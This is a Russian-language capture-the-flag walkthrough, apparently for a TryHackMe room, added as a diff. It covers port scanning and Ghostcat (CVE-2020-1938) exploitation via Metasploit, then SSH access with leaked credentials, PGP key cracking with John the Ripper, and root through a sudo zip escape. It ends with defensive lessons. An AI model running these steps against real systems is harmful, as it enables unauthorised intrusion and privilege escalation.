@@ -1,0 +1,111 @@
+Reconnaissance
+Первым шагом выполняем сканирование портов:
+22/tcp   open  ssh
+53/tcp   open  domain
+8009/tcp open  ajp13
+8080/tcp open  http
+
+Порт 8080 указывает на Apache Tomcat, а 8009 (AJP) потенциально уязвим к Ghostcat (CVE-2020-1938).
+
+🌐 Web Enumeration (Tomcat Ghostcat)
+http://<IP>:8080
+Для эксплуатации используем Metasploit:
+
+msfconsole
+search tomcat
+use auxiliary/admin/http/tomcat_ghostcat
+set RHOSTS <IP>
+set RPORT 8009
+run
+
+В результате получаем чувствительные данные из web.xml:
+skyfuck:8730281lkjlkjdqlksalks
+
+**username: skyfuck**
+**pass: 8730281lkjlkjdqlksalks**
+
+🔐 Initial Access (SSH)
+
+Подключаемся по SSH:
+ssh skyfuck@<IP>
+
+📁 File Transfer
+
+В домашней директории пользователя обнаружены файлы:
+
+* credential.pgp
+* tryhackme.asc
+
+Запускаем HTTP-сервер на машине жертвы:
+python3 -m http.server 1234
+
+Скачиваем файлы на Kali:
+wget http://<IP>:1234/credential.pgp
+wget http://<IP>:1234/tryhackme.asc
+
+🔑 PGP Key Cracking
+
+Конвертируем PGP-ключ в формат для John:
+gpg2john tryhackme.asc > hash
+
+Запускаем брутфорс:
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+Найден пароль:
+**alexandru**
+
+Импортируем ключ и расшифровываем файл:
+
+* gpg --import tryhackme.asc
+* gpg --decrypt credential.pgp
+
+Результат:
+merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+**username: merlin**
+**pass: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j**
+
+👤 User Flag
+
+Переключаемся на пользователя merlin:
+su merlin
+
+Читаем user flag:
+cat user.txt
+
+✅ User flag получен
+
+🚀 Privilege Escalation
+
+Проверяем sudo-права:
+sudo -l
+
+Output:
+(ALL) NOPASSWD: /usr/bin/zip
+
+Используем известную технику из GTFOBins:
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+
+Получаем root-shell:
+whoami
+> # root
+
+Читаем root flag:
+cat /root/root.txt
+
+✅ Root flag получен
+
+
+🏁 Conclusion
+
+В данном задании были использованы:
+* Уязвимость Ghostcat (CVE-2020-1938)
+* Кража и расшифровка PGP-ключей
+* Password cracking с John the Ripper
+* Privilege Escalation через sudo + zip
+
+Задание отлично демонстрирует важность:
+* защиты AJP
+* корректных sudo-настроек
+* безопасного хранения криптографических ключей
